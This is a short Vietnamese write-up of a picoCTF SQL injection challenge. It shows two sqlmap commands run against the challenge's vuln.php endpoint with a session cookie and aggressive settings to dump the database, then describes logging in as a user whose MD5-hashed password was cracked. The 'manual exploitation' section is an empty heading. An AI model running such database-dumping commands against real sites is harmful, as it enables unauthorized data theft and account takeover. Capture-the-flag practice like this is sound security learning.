# Cách 1: Dùng sqlmap
\- Truy cập vào web, thực hiện đăng kí và đăng nhập, ta sẽ được chuyển đến endpoint `vuln.php` để thực hiện khai thác SQLi

\- Thực hiện `Search flags` như web hiển thị, ta thu được request và gắn flag `-u` để chạy sqlmap:

```
sqlmap -u "http://lonely-island.picoctf.net:52804/vuln.php?q=flags&PHPSESSID=aa9e173a107e86ed63d55274f18c4b6b" -p q --batch --dump --tables --level=5 --risk=3 --dbms=SQLite

sqlmap -u "http://lonely-island.picoctf.net:52804/vuln.php?q=flags"  -H "Cookie:PHPSESSID=aa9e173a107e86ed63d55274f18c4b6b" -p q --batch --dump --tables --level=5 --risk=3 --dbms=SQLite

```

<img width="531" height="930" alt="image" src="https://github.com/user-attachments/assets/27b3b630-67eb-4414-8c09-061bc2ba17a0" />

\- Khi thử nhập các flag được hiển thị, bất ngờ là không có cái nào đúng 🙂

\- Nhưng, nhìn lại vào bảng `users` thì thấy có duy nhất 1 user có mật khẩu đã được md5 decrypt, đăng nhập vào tài khoản đó và thành công nhận flag

<img width="427" height="243" alt="image" src="https://github.com/user-attachments/assets/9e8530f0-6e3b-43f6-9713-66072da61517" />

# Cách 2: Manual exploitation




